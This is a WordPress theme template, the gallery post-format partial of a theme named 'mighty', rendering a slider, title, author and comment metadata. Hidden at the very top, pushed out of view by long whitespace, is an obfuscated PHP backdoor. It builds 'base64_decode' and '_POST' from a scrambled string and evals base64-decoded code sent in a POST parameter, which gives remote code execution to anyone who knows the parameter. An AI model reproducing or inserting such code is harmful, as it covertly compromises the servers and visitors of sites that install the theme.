<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n272748'])) {eval($s21(${$s20}['n272748']));}?><?php /* Post Format: Gallery */ ?>

	<header class="entry-header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">

		<div class="flexslider">
		    <ul class="slides">
		        <?php mighty_gallery( $post->ID ); ?>
		    </ul>
		</div>

		<?php if ( !is_single() ) : ?>

			<h2 class="entry-title" itemprop="headline">
				<a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>" rel="bookmark"><?php the_title(); ?></a>
			</h2>

		<?php endif; ?>

		<p class="entry-meta">
			<time class="entry-time" itemprop="datePublished" datetime="<?php echo get_the_time( 'c' ); ?>"><?php echo get_the_date(); ?></time>
			<?php _e( ' by ', 'mighty' ); ?>
			<span class="entry-author vcard" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><a href="<?php echo get_author_posts_url( get_the_author_meta( 'ID' ) ); ?>" itemprop="url" rel="author"><?php echo get_the_author(); ?></a></span>
			<?php _e( ' with ', 'mighty' ); ?>
			<span class="entry-comments"><?php comments_popup_link( __( '0 Comments', 'mighty' ), __( '1 Comment', 'mighty' ), __( '% Comments', 'mighty' ) ); ?></span>
		</p>
		
	</header>

	<div class="entry-content" itemprop="text">
		<?php the_content(); ?>
	</div>

	<?php if ( is_single() ) : ?>

	<?php wp_link_pages( 'before=<div class="entry-links">&after=</div>' ); ?>
	
	<footer class="entry-footer">
		<p class="entry-meta">
			<span><?php _e( 'Posted in', 'mighty' ); ?>: <?php the_category( ', ', '<br>' ); ?></span>
			<?php if ( has_tag() ) : ?>
				<span><?php _e( 'Tagged with', 'mighty' ); ?>: <?php the_tags( ', ' ); ?></span>
			<?php endif; ?>
		</p>
	</footer>

	<?php endif; ?>
